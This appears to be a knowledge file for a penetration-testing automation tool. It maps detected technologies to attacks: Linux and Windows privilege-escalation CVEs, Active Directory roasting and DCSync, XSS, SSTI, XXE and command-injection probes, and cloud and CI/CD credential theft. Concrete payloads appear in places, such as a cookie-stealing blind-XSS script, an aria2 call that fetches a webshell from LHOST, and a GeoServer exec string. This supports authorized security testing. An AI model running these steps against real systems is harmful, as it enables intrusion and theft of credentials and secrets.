_comment: Tech fingerprint -> targeted tests. next_move matches each key (regex, case-insensitive) against a state row's tech/services/notes/os and emits a [test] move. 'prio' 1/2/3 = info/default/pre-auth-critical -> next_move score 85/90/95 (sorted before the cap so a critical is never truncated below an info match); default 2 if absent. 'approach' (optional list of ctf/bugbounty/pentest) tunes ranking to the active engagement_type: on-approach +6, off-approach -4, absent = neutral (fires for all). Most enterprise/CVE fingerprints are left neutral; CTF foothold signals are tagged ctf/pentest. 'anchor' (optional str/list) = keyword(s) used to pull the matching rows from a row-structured cheatsheet ref (default-credentials/api-request-findings/cve-arsenal); defaults to the fingerprint label, set it only where the vendor name differs (e.g. fortigate -> Fortinet). 'skills' = hunt skill to invoke; 'tests' = concrete things to try; 'refs' = reuse-list / payload pages. Vault-resident knowledge; extend freely.

tests: DirtyPipe CVE-2022-0847: kernel 5.8-5.16.x. Try public one-shot PoC (overwrite /etc/passwd or hijack a SUID binary). VERIFY exact uname -r first: fixed in 5.16.11/5.15.25/5.10.102, many distros backport the fix into a 5.10/5.15 build that still matches the major.minor band.

DirtyCOW CVE-2016-5195 on old kernel (<4.8.3). Use dirtyc0w/cowroot/pokemon variant matching the kernel to race COW and overwrite /etc/passwd or a SUID binary. CAVEAT: race-based, can crash the box; confirm not backport-patched before firing.

Modern kernel (5.17+/6.x/7.x): check the Tinoco 2026 page-cache LPE set (copyfail CVE-2026-31431 ~4.14-6.19.12; peditcow CVE-2026-46331 5.18-7.1-rc6; fragnesia CVE-2026-46300; DirtyClone CVE-2026-43503 v7.1-rc1..rc4; dirtyfrag CVE-2026-43284/43500; PinTheft CVE-2026-43494 5.4-7.0; ssh-keysign-pwn CVE-2026-46333 5.6+). github.com/rafaeldtinoco/security. VERIFY exact uname -r band AND that the required module is loadable (most distros blacklist algif_aead/esp4/esp6/rxrpc/act_pedit/rds); run in isolated VM only.

PwnKit CVE-2021-4034: if /usr/bin/pkexec is SUID, try PwnKit.c for instant root. CAVEAT: the kernel argc==0 execve mitigation breaks it on patched 5.x kernels even when pkexec is present (THM Ollie lesson). Verify pkexec version AND kernel before burning the attempt; also broken by polkit update.

Baron Samedit CVE-2021-3156 (sudo 1.8.2-1.8.31p2 / 1.9.0-1.9.5p1): heap overflow via 'sudoedit -s' + trailing backslash, use per-distro exploit offsets. ALSO sudoedit CVE-2023-22809 (sudo 1.8.0-1.9.12p1): EDITOR/SUDO_EDITOR + extra '--' to edit arbitrary file like /etc/sudoers IF user has a sudoedit rule. Confirm exact 'sudo --version' and 'sudo -l' first.

nf_tables UAF family: try CVE-2024-1086 (nft_verdict, reliable public PoC) and Tinoco nft-catchall-uaf CVE-2026-23111 (regression of CVE-2023-4244, ~5.4-6.12.5). Run the PoC's 'check' mode first. Needs unprivileged userns (CONFIG_USER_NS) + CONFIG_NF_TABLES; RANDOM_KMALLOC_CACHES / X86_KERNEL_IBT defeat many builds. Per-kernel offsets required.

Looney Tunables CVE-2023-4911: glibc ld.so buffer overflow via crafted GLIBC_TUNABLES (vulnerable glibc 2.34-2.38 era). Confirm 'ldd --version' is in range; patched glibc is immune. Use the distro-matching public exploit.

GameOver(lay) CVE-2023-2640 / CVE-2023-32629: Ubuntu-specific overlayfs bug. Via unprivileged userns set file caps (cap_setuid) on an overlayfs upper file -> SUID-like root. CAVEAT: Ubuntu-only (the delta is in Ubuntu's overlayfs); confirm /etc/os-release is Ubuntu and userns is available.

Tinoco ssh-keysign-pwn CVE-2026-46333 (ptrace exit-race): if SUID ssh-keysign (or chage) present and kernel >=5.6 before fix 31e62c2ebbfd, race pidfd_getfd against the exiting SUID helper to steal root fds (SSH host keys -> MITM, /etc/shadow -> crack). VERIFY kernel not in fixed set (7.0.8/6.18.31/6.12.89/6.6.139/6.1.173/5.15.207/5.10.256); mitigated by yama ptrace_scope>=2. github.com/rafaeldtinoco/security/exploits/ssh-keysign-pwn.

Potato attack: SeImpersonate/SeAssignPrimaryToken -> SYSTEM. Pick by OS build: GodPotato (universal Win10/11/2016-2022) or PrintSpoofer (needs spooler running) on 2019+/1809+; JuicyPotato only on older (<=2016 / Win10 <1809). Run 'whoami /priv' to confirm Enabled first.

PrintNightmare CVE-2021-34527: if Print Spooler running, load a malicious driver DLL via RpcAddPrinterDriverEx -> SYSTEM (local) or domain. VERIFY KB patch level and PointAndPrint registry; can crash the spooler. Confirm 'Get-Service Spooler' is Running.

SeBackup: backup-read SAM+SYSTEM (robocopy /b or diskshadow) -> secretsdump -> pass-the-hash. SeRestore: overwrite a privileged service binary/DLL. Also check SeriousSAM/HiveNightmare CVE-2021-36934 if BUILTIN\Users can read C:\Windows\System32\config\SAM and a VSS shadow copy exists.

AlwaysInstallElevated: if BOTH HKLM and HKCU ...\Installer\AlwaysInstallElevated = 1, build msfvenom MSI payload and run 'msiexec /quiet /i evil.msi' as SYSTEM. Confirm BOTH reg keys are 1 (one alone does nothing) via 'reg query'.

AD privesc: Zerologon CVE-2020-1472 (Netlogon, DESTRUCTIVE - blanks DC machine pw, restore after); noPac CVE-2021-42278/42287 (needs MachineAccountQuota>0) -> TGT as DC -> DCSync; PetitPotam coerce -> NTLM relay to ADCS (ESC8); Certipy ADCS ESC1-8 + Certifried CVE-2022-26923 (dNSHostName spoof). Enumerate templates/MAQ/patch state with hunt-ad first; each has distinct preconditions.

DOMAIN CONTROLLER detected. Build the user list FIRST: scrape EVERY page of any web app (team/about/staff/leadership/testimonial/contact), extract ALL 'First Last' names (not just the homepage), + OSINT + a SecLists name list; generate f.last/flast/first.last/last permutations -> kerbrute userenum (lockout-safe) to confirm which exist and the format.
Then: AS-REP roast every valid user (GetNPUsers -no-pass) -> hashcat m18200; null-session SMB/LDAP + rpcclient/enum4linux-ng; --pass-pol then lockout-gated spray; Kerberoast; BloodHound -c all.
Escalate: check privileged group membership (Server Operators/Backup Operators/DnsAdmins), ADCS ESC, delegation, RBCD.
SQLi in user/pass: test ALL quote contexts (' " numeric) + second-order (stored username used unsafely on another page)
default/weak creds (NO spray if anti-bruteforce noted)
if the password is hashed INSIDE the SQL -> read plaintext from information_schema.PROCESSLIST
injection confirmed by error -> in-band FIRST (UNION/error-based) before blind
reflected: inject `"><svg onload=alert(1)>` per field, check output encoding/context
stored: persist payload, view as another user
BLIND XSS (admin bot / 'actively monitored' / report-to-admin): OOB payload `"><script src=//OOB></script>` to steal admin cookie/session -> needs an OOB listener

SSTI signal (49 returned from {{7*7}}/${7*7}, or a template-engine stack error). Fingerprint the engine via the payloads/ssti.md matrix (Jinja2/Twig/Freemarker/Velocity/ERB/Smarty), then escalate to RCE with the engine-specific gadget. OOB-gate blind cases.

XML/SOAP entity surface. Test XXE: external-entity file read (file:///etc/passwd), SSRF via an entity URL, and blind OOB XXE (parameter entity to your OAST listener). SVG/DOCX/SAML are XXE carriers too. OOB-mandatory for blind XXE.

Command-injection surface (a cmd/exec/command/ping-style param, or reflected id output uid=..gid=..). Test separators ; | && || newline $() and backticks; if filtered, apply the charset-filter bypasses in payloads/command-injection.md. OOB-gate blind cases with a DNS/HTTP callback.
file:// wrapper (realpath-gated LFI still reads the whole allowed base -> read ALL app source, the vuln is in it)
1.4.x authed SQLi->RCE (EDB-50963: subnet param UNION INTO OUTFILE webshell)
config.php DB creds -> reuse for SSH
no public PoC -> patch-diff / n-day research (raw/research/)
CVE-2025-29927 middleware auth bypass via x-middleware-subrequest
COLOCATED file-write primitive (aria2, backup/restore API, upload) -> drop a JSP into /opt/tomcat/webapps/ROOT for RCE without manager creds

aria2 JSON-RPC (:6800) is usually UNAUTHENTICATED (rpc-secure:false, no secret). Confirm via aria2.getVersion / aria2.getGlobalOption (getGlobalOption leaks `dir` + `conf-path` = the running user's home, e.g. runs as tomcat)

arbitrary file WRITE as the aria2 user: aria2.addUri(["http://LHOST/x"],{"dir":"<target dir>","out":"<name>"}) -> drop a JSP into a colocated Tomcat webroot (/opt/tomcat/webapps/ROOT/shell.jsp) or a key into ~/.ssh/authorized_keys -> RCE/SSH as that user
on-download-complete / on-download-error hook option = command exec as the aria2 user

Linux foothold + kernel version captured. Enumerate FIRST (pspy for cron/root procs, sudo -l, SUID/caps, writable service files) - most boxes fall to a misconfig. THEN, before reaching for memory/public CVEs, consult the KERNEL LPE ARSENAL (privesc-exploit-arsenal.md): match the exact `uname -r` band and VERIFY the precondition (module loadable / AF reachable / userns). The Tinoco 2026 page-cache set (copyfail/dirtyfrag/peditcow/... CVE-2026-*) spans 4.14->7.x and is unpatched on most pre-2026 boxes. LAB-CONFIRMED: copyfail CVE-2026-31431 roots a 5.4.0-173 box from low-priv (probe: bind AF_ALG aead authencesn(hmac(sha256),cbc(aes)) -> if it binds, reachable).
Okta AiTM/session theft + admin abuse (if Okta)
az login --identity (act AS the resource's managed identity from IMDS - do not hand-parse the token JSON)
az resource list (the MI often sees a Key Vault/storage the low-priv user cannot)
RBAC vault + Owner/UAA: self-assign 'Key Vault Secrets User' then read secrets, revert after (RoE)
az vm run-command invoke if Contributor -> SYSTEM/root on any VM
UAMI: attach a high-priv user-assigned identity to a box you control, mint its token
Fortinet CVE-2024-21762 RCE / CVE-2022-40684 auth bypass
Citrix CVE-2025-5777 CitrixBleed-2 memory disclosure / PAN-OS CVE-2025-0108 auth bypass / FortiWeb CVE-2025-25257 pre-auth SQLi -> RCE
AD LDAP (Microsoft AD LDAP / a DC) -> hunt-ad: anonymous bind, user enum, --bloodhound
app LDAP query -> hunt-injection: LDAP injection in filters
on a DC: harvest users -> spray/AS-REP roast
CVE-2025-31161 auth bypass (race in the AWS4-HMAC Authorization header parse -> impersonate any user incl crushadmin, no creds)
CVE-2024-4040 VFS sandbox escape + SSTI -> arbitrary file read / RCE
confirm at / or /WebInterface/; version is on the login page

CVE-2024-36401 OGC-filter evaluation RCE (GeoServer <2.25.1/2.24.3/2.23.5, CISA KEV): a WFS/WMS request param is evaluated as a commons-jxpath expression -> exec(). e.g. ?...&propertyName=exec(java.lang.Runtime.getRuntime(),'id')

CVE-2025-53770/49704/49706 'ToolShell' pre-auth RCE chain (2025 mass-exploited): unauth POST /_layouts/15/ToolPane.aspx?DisplayMode=Edit ViewState deserialization -> webshell (spinstall0.aspx) + MachineKey theft; patch AND rotate the ASP.NET MachineKey
CVE-2024-20767 arbitrary file read via admin panel
CVE-2023-34048 DCERPC out-of-bounds write -> unauth RCE (vCenter 7.0/8.0, exploited in the wild)
CVE-2023-51467 / CVE-2023-49070 auth bypass -> SSTI/XML-RPC RCE
AWS creds found -> aws sts get-caller-identity, enumerate IAM (list keys/users/roles), hunt privesc paths (iam:PassRole, CreatePolicyVersion, AssumeRole), pivot with assumed roles
Cognito: enumerate identity pool ID, unauth GetId/GetCredentialsForIdentity for guest AWS creds, user-pool self-signup + attribute/role tampering
DynamoDB: aws dynamodb list-tables + scan for secrets/tokens, test NoSQL-style operator injection in app-driven queries
EC2: describe-instances, read user-data, steal IMDS role creds (169.254.169.254), snapshot/AMI theft, mount EBS volume
Lambda/API Gateway: list-functions, dump code + env vars for secrets, invoke with tampered event, enumerate API Gateway stages/keys
SSM: send-command RCE on managed instances, read SecureString params (get-parameters --with-decryption), start-session
Azure DevOps: steal service-connection secrets, poison azure-pipelines.yml, self-hosted agent takeover, extract variable groups
Buildkite: agent/pipeline hijack, secret exfil from build steps, poisoned pipeline execution
CircleCI: leak context/project env vars, poison .circleci/config.yml, malicious orb supply-chain
Drone CI: poison .drone.yml, extract pipeline secrets, privileged plugin/step abuse
GitLab CI: poison .gitlab-ci.yml, protected-variable exfil, shared/self-hosted runner takeover, CI_JOB_TOKEN abuse
tn5250 enumerate user profiles; spray common default passwords (QSECOFR/QSECOFR); DB2 for i SQL access; check *ALLOBJ/*SECOFR special authorities for privesc
default/blank creds on embedded/IoT gear; nmap telnet-ntlm-info (Windows leaks hostname/domain/build); hydra low-concurrency brute; banner->CVE (Solaris/Inetutils)
snmpwalk -v2c -c public + onesixtyone community brute -> processes/creds; showmount -e (NFS exports) + no_root_squash mount; rpcinfo -p / rpcclient null session

Android app assessment: decompile the APK with apktool/jadx, review AndroidManifest for exported components/debuggable + insecure permissions, MITM TLS via Burp CA + Frida/objection SSL-pinning bypass, and grep SharedPreferences/SQLite/logcat for secrets

Liferay Portal detected (x-powered-by / Liferay-Portal header, /c/portal, /web/guest, /api/jsonws). Unauth JSON web services RCE CVE-2020-7961 (Java deserialization via JSONWS /api/jsonws); Groovy script console RCE for portal admins (Control Panel -> Server Administration -> Script); SSRF/open-redirect in JSONWS; grab exact version -> CVE. Default admin test@liferay.com:test.
macOS host detected. Enumerate first: csrutil status (SIP), spctl --status (Gatekeeper), TCC.db grants, launchd agents/daemons, installed .app bundles.
Credential loot: security CLI / keychain dump (macos-keychain), then the wider macos-loot-locations sweep (local password hashes -> hashcat -m 7100).

Escalation: pick the path that matches what's actually gating you - TCC bypass, Gatekeeper/code-signing/AMFI bypass, XPC service abuse, dylib/library/thread injection into a privileged process, sandbox escape, or a writable launchd/cron persistence vector.
